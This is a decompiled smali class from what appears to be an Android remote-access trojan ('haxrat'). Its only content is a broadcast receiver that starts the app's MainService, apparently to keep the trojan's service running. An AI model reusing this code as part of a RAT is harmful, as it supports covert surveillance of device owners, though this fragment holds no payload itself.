.class public Lcom/hax4us/haxrat/ServiceReciever;
.super Landroid/content/BroadcastReceiver;
.source "ServiceReciever.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 13
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 15
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Landroid/content/Intent;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 11
    move-object v0, p0

    move-object/from16 v1, p1

    move-object/from16 v2, p2

    move-object v6, v1

    new-instance v7, Landroid/content/Intent;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    move-object v9, v1

    invoke-virtual {v9}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    :try_start_0
    const-string v10, "com.hax4us.haxrat.MainService"

    invoke-static {v10}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v10

    invoke-direct {v8, v9, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v6, v7}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v6

    return-void

    :catch_0
    move-exception v6

    move-object v4, v6

    new-instance v6, Ljava/lang/NoClassDefFoundError;

    move-object v14, v6

    move-object v6, v14

    move-object v7, v14

    move-object v8, v4

    invoke-virtual {v8}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v6
.end method
